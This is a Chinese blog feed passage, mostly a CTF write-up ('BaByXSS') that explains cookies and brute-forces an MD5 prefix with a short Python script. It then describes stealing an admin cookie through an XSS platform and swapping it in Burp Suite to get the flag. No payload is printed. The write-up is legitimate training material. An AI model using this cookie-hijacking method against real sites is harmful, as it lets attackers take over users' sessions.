class="undefined"></span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">console</span>.log(<span class="number">5</span> + <span class="number">6</span>);</span></span><br><span class="line"><span class="undefined">&gt; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote></script></p></li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、JS-简介&quot;&gt;&lt;a href=&quot;#一、JS-简介&quot; class=&quot;headerlink&quot; title=&quot;一、JS 简介&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;一、JS 简介&lt;/font&gt;&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;getElement
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="JavaScritpt" scheme="https://muzibing.github.io/tags/JavaScritpt/"/>
    
  </entry>
  
  <entry>
    <title>BaByXSS 解题总结</title>
    <link href="https://muzibing.github.io/2019/07/27/2019.07.27%EF%BC%8876%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/07/27/2019.07.27（76）/</id>
    <published>2019-07-26T16:00:00.000Z</published>
    <updated>2019-07-29T07:05:19.161Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a><font color="brown">一、基础知识</font></h3><h4 id="1-XSS-攻击"><a href="#1-XSS-攻击" class="headerlink" title="1. XSS 攻击"></a><font color="navy">1. XSS 攻击</font></h4><blockquote><p>​        有关 XSS 攻击的基础知识、原理、手段、类别和目的均已在昨天的博文中均有涉及，具体的可以<a href="https://muzibing.github.io/2019/07/26/2019.07.26（75）/">点击这里进行查看</a>，有关 XSS 攻击更详细的知识，我还会将在后期陆续进行更新和补充。</p></blockquote><h4 id="2-Cookie"><a href="#2-Cookie" class="headerlink" title="2. Cookie "></a><font color="navy">2. Cookie </font></h4><blockquote><p><strong><font color="red">① 什么是 Cookie？</font></strong></p><p>​        <strong>Cookie</strong>（复数形态Cookies），又称为“小甜饼”。类型为“<strong>小型文本文件</strong>”<a href="https://zh.wikipedia.org/wiki/Cookie#cite_note-1" target="_blank" rel="noopener">[1]</a>，指某些<a href="https://zh.wikipedia.org/wiki/网站" target="_blank" rel="noopener">网站</a>为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过<a href="https://zh.wikipedia.org/wiki/加密" target="_blank" rel="noopener">加密</a>）。由<a href="https://zh.wikipedia.org/wiki/网景公司" target="_blank" rel="noopener">网景公司</a>的前雇员<a href="https://zh.wikipedia.org/wiki/盧·蒙特利" target="_blank" rel="noopener">卢·蒙特利</a>在1993年3月发明。最初定义于RFC 2109。当前使用最广泛的 Cookie标准却不是RFC中定义的任何一个，而是在网景公司制定的标准上进行扩展后的产物。    </p><h5 id="②-Cookie-的用途是什么？"><a href="#②-Cookie-的用途是什么？" class="headerlink" title="② Cookie 的用途是什么？"></a><font color="red">② Cookie 的用途是什么？</font></h5><p>​        因为<a href="https://zh.wikipedia.org/wiki/HTTP" target="_blank" rel="noopener">HTTP协议</a>是无状态的，即<a href="https://zh.wikipedia.org/wiki/服务器" target="_blank" rel="noopener">服务器</a>不知道用户上一次做了什么，这严重阻碍了<a href="https://zh.wikipedia.org/wiki/交互式Web应用程序" target="_blank" rel="noopener">交互式Web应用程序</a>的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两瓶饮料。最后结帐时，由于HTTP的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么，所以Cookie就是用来绕开HTTP的无状态性的“额外手段”之一。服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器<a href="https://zh.wikipedia.org/wiki/会话_(计算机科学" target="_blank" rel="noopener">会话</a>)中的状态。</p><p><br>        在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。用户继续选购饮料，服务器就在原来那段Cookie里追加新的商品信息。结帐时，服务器读取发送来的Cookie就行了。</p><p><br>        <strong>Cookie另一个典型的应用是当登录一个网站时，网站往往会请求用户输入用户名和密码，并且用户可以勾选“下次自动登录”</strong>。如果勾选了，那么下次访问同一网站时，用户会发现没输入用户名和密码就已经登录了。这正是因为前一次登录时，服务器发送了包含登录凭据（用户名加密码的某种<a href="https://zh.wikipedia.org/wiki/加密" target="_blank" rel="noopener">加密</a>形式）的Cookie到用户的硬盘上。第二次登录时，如果该Cookie尚未到期，浏览器会发送该Cookie，服务器验证凭据，于是不必输入用户名和密码就让用户登录了。</p><p>注：上述信息来源 <a href="https://zh.wikipedia.org/wiki/Cookie" target="_blank" rel="noopener">wikipedia</a> </p><h5 id="③-什么是Cookie-劫持？"><a href="#③-什么是Cookie-劫持？" class="headerlink" title="③ 什么是Cookie 劫持？"></a><font color="red">③ 什么是Cookie 劫持？</font></h5><p>​        所谓 Cookie 劫持就是攻击者通过非法的手段获取用户浏览器的 Cookie，攻击者用获取到的 Cookie 伪装成被攻击者的身份，与服务器进行信息传递。</p></blockquote><h4 id="3-相关工具"><a href="#3-相关工具" class="headerlink" title="3. 相关工具"></a><font color="Navy">3. 相关工具</font></h4><blockquote><ul><li><strong><a href="https://portswigger.net/burp" target="_blank" rel="noopener">Burp Suite</a></strong>：Burp Suite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。</li><li><strong><a href="http://xss.fbisb.com/xss.php" target="_blank" rel="noopener">XSS 平台</a></strong>：提供 XSS 攻击的平台。</li><li>proof</li></ul></blockquote><h4 id="4-其他内容"><a href="#4-其他内容" class="headerlink" title="4. 其他内容"></a><font color="Navy">4. 其他内容</font></h4><blockquote><ul><li>代理服务的设置</li><li>Burp Suite 证书的导出以及浏览器证书的导入问题</li><li><strong>substr() 函数（字符截取函数）格式</strong>：<ul><li>格式 1：substr(string string,int a,int b);<ul><li>string：是需要截取的字符串；</li><li>a：截取字符串的开始位置（注：当a等于0或1时，都是从第一位开始截取）；</li><li>b：要截取的字符串的长度</li></ul></li><li>格式2：substr(string string, int a) ;<ul><li>string：是需要截取的字符串；</li><li>a：可以理解为从第a个字符开始截取后面所有的字符串。</li></ul></li></ul></li><li>python  md5 加密方式</li></ul></blockquote><h3 id="二、前期准备"><a href="#二、前期准备" class="headerlink" title="二、前期准备"></a><font color="brown">二、前期准备</font></h3><h4 id="1-分析题目"><a href="#1-分析题目" class="headerlink" title="1. 分析题目"></a><font color="navy">1. 分析题目</font></h4><p><img src="http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/MTZLFomu6xu1alifDSR4tqOgYCQI47UjbPjRyv0R.L8!/r/dE0BAAAAAAAA" alt></p><blockquote><p>​        通过上面的题目的提示，我们一点一点的来分析题目的要求：</p><ul><li><p>首先我们所要求的 flag 在 admin.PHP 文件中，只有管理员才能得到它；</p></li><li><p>那么最直接得方法就是，我们可以发送一条消息给管理员请求他们把 flag 给我们，但是管理员是不会鸟我的；</p></li><li><p>leava a message 这一个表格中应该是我们要发送的数据；</p></li><li><p>substr(md5(‘***********‘),0.6) === ‘e6a5c3’  这里面的表格应该是让我们填写的内容经过一系列运算，最后的结果应该与 ‘ ’ 中的字符串同类型同值；</p></li></ul><p>  ​        经过上述分析后，我们可以大概的清楚这道题目的<font color="red"><strong>解题思路</strong></font>：</p><ul><li>我们首先要得到 md5(‘****‘) 中 * 的内容，这一步估计需要自己写脚本，进行运算；</li><li>我们将 message 和正确的 string 发送给服务器，服务器应该会给我们作出反应，并且在浏览器产生 Cookie，而这个 Cookie 代表浏览器的身份；</li><li>再去点击 <font color="navy">admin.PHP</font> 就会得到我们想要的 Flag；</li></ul></blockquote><h4 id="2-提出问题"><a href="#2-提出问题" class="headerlink" title="2. 提出问题"></a><font color="navy">2. 提出问题</font></h4><blockquote><p>​        我们经过前面的分析，可能会产生如下的疑问：</p><p>​        （1）我们怎么才能得到一个 str1，在经过 MD5 加密后，并将加密后得到的字符串，经 substr() 函数截取前 <strong>6</strong> 个字符得到的 ‘ === ’ 后面跟着的字符串？</p><p>​        （2）在计算出正确的 str1 后，我们应该怎么得到 token 令牌呢？</p></blockquote><h4 id="3-查阅资料"><a href="#3-查阅资料" class="headerlink" title="3. 查阅资料"></a><font color="navy">3. 查阅资料</font></h4><blockquote><p>​        为了解决上述的问题，对此我上网查阅了相关的文章和资料，提出下方的解决办法：</p><p>​        （1）针对第一个问题，我们可以利用 python 的库对此进行求解；</p><p>​        （2）针对第二个问题，我们可以利用 XSS 平台来获得 Cookie 的 token 令牌；</p></blockquote><h3 id="三、解题步骤"><a href="#三、解题步骤" class="headerlink" title="三、解题步骤"></a><font color="brown">三、解题步骤</font></h3><h4 id="1-求加密前的字符串"><a href="#1-求加密前的字符串" class="headerlink" title="1. 求加密前的字符串"></a><font color="navy">1. 求加密前的字符串</font></h4><blockquote><p>​        相关代码如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib                  <span class="comment"># This module implements a common interface to many different secure hash and message digest algorithms. Included are the FIPS secure hash algorithms SHA1, SHA224, SHA256, SHA384, and SHA512 (defined in FIPS 180-2) as well as RSA’s MD5 algorithm </span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count     <span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(Md5_str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(Md5_str.encode(encoding=<span class="string">'utf8'</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> count(<span class="number">0</span>):              <span class="comment"># 这是一个计数器，是 itertools 下的一个功能</span></span><br><span class="line">    Str = md5(str(i))</span><br><span class="line">    <span class="keyword">if</span> Str.startswith(<span class="string">'Name of string'</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><blockquote><p>​        关于上的脚本程序，我会后续进行总结和更新，现在就简单的叙述一下，在这个脚本中主要涉及了以下几个知识点：</p><p>​        （1）md5 用 python 加密需要导入 hashlib 库</p><p>​        （2）要实现一个无限循环，需要用 itertools 中的 count，有关这个用法我会在下期博客进行详细的讲解</p><p>​        （3）要明白 python 中对象的用法</p></blockquote><h4 id="2-利用-XSS-平台获取-Cookie（admin）"><a href="#2-利用-XSS-平台获取-Cookie（admin）" class="headerlink" title="2. 利用 XSS 平台获取 Cookie（admin）"></a><font color="navy">2. 利用 XSS 平台获取 Cookie（admin）</font></h4><blockquote><p>​        如果上一步提交的字符串正确的话，那么我们就可以与服务器成功建立连接，但是这是一种非持久连接，如果我们用这时的 Cookie 再点击 admin.PHP 的话，我们就可以获取 Flag。</p><p><br>        我们将 XSS 平台的代码放到 message 中，再将得到的数值放入 MD5 中，进行提交，在 XSS 平台上 我们可以获得如下的界面：<img src="http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/yoGqYpHiRIjLqEU3n4YiTlf13dUDCTnr8KfDkBfaF*w!/r/dL4AAAAAAAAA" alt></p><p>​        这个时候我们截取到了浏览器与服务器交互的 Cookie 中的 token 令牌</p></blockquote><h4 id="3-设置-Burp-Suite"><a href="#3-设置-Burp-Suite" class="headerlink" title="3. 设置 Burp Suite"></a><font color="navy">3. 设置 Burp Suite</font></h4><blockquote><p>​        在替换 Cookie 之前，我们需要用 Burp Suite 软件（需要配置 Java 环境）截断浏览器发给服务器的 Cookie，首先需要设置代理，如下图：左图为 Burp Suite 的代理，右图为浏览器（Microsoft Edge）的代理设置。两者的代理设置要一致。</p><p><img src="http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/sfiunwZ0AA4FlXCvFgkcSS8PAB4UKTFtOoH1r8WWRSU!/r/dFQBAAAAAAAA" alt></p></blockquote><h4 id="4-替换-Cookie"><a href="#4-替换-Cookie" class="headerlink" title="4. 替换 Cookie"></a><font color="navy">4. 替换 Cookie</font></h4><blockquote><p>​        当我们只是“单纯”的点击 admin.PHP 链接后，服务器会给我们一个这样的页面：</p><p><img src="http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/6dv26Wy04Py1bAfWA0fOze0*Xv0nhmSK8mEC2lc.HQw!/r/dL8AAAAAAAAA" alt></p><p>​        该页面说明我们不是以管理员的身份访问服务器的，所以自然也不能得到 flag。那么我们该怎么以管理员的身份访问服务器呢？前面我们提交了一个 MD5 加密前的一个字符串，以及一个 XSS 代码，服务器给我们返回的页面如下：</p><p><img src="http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/RnJVyZn0qtflOXlmBUGUBjtmFfYQ*YOW8LCIxIZqAAc!/r/dFQBAAAAAAAA" alt></p><p>​        红色标注意思为：<font color="red"><strong>您的邮件已在管理员列表的队列中</strong></font>，说明前面我们前面得到的 Cookie 已经被放入管理员列表中了，我们可以通过 XSS 平台获取的 Cookie 进入 admin.PHP （也就是以管理员的身份进入 admin.PHP）得到 flag。</p><p>​        我们点击<font color="navy"> admin.PHP</font> 后，Burp Suite 会为我们截获一个浏览器发送给服务器的请求，在这个请求会存在一个 Cookie，这个Cookie 的数据就是我们将要替换的目标，如下图所示：<img src="http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/iBXwrFzF1PCvzaOgvNpKTUL3qTURpCRykNIEau1lmio!/r/dFMBAAAAAAAA" alt></p><p>​        在将 Cookie 进行替换后，下一步只需要点击 “Forward” 按钮，将网页数据发送给服务器。        <img src="http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/x5oLgkHhVxJEYsMj0xQ1fijgbE2jwvDPxWstkc2H10k!/r/dLYAAAAAAAAA" alt></p><p>​        这个时候服务器会识别 GET 中的 Cookie，发现该 Cookie 在管理员的列表中，服务器于是认为发送该请求的主体是 admin，于是服务器会把 flag 返回给浏览器，如下图：</p><p><img src="http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/ArLdu7aCmVNQAYYMQYQxajyakybQlwqBSrSLvdprhvo!/r/dLgAAAAAAAAA" alt></p></blockquote><h3 id="四、遗留问题"><a href="#四、遗留问题" class="headerlink" title="四、遗留问题"></a><font color="brown">四、遗留问题</font></h3><blockquote><p>​        虽然这道题目做出来了，但是仍然有很多问题等着我去解决，现在将这些问题一一列举出来，以方便以后的学习：</p><ol><li>Cookie 的完整机制和知识</li><li>XSS 的完整知识体系结构</li><li>HTML 的运行原理</li><li>python MD5 的加密和解密程序分析</li><li>Burp Suite 的其他功能</li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、基础知识&quot;&gt;&lt;a href=&quot;#一、基础知识&quot; class=&quot;headerlink&quot; title=&quot;一、基础知识&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;一、基础知识&lt;/font&gt;&lt;/h3&gt;&lt;h4 id=&quot;1-XSS-攻击&quot;&gt;&lt;a href=&quot;#1-
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="XSS" scheme="https://muzibing.github.io/tags/XSS/"/>
    
  </entry>
  
</feed>
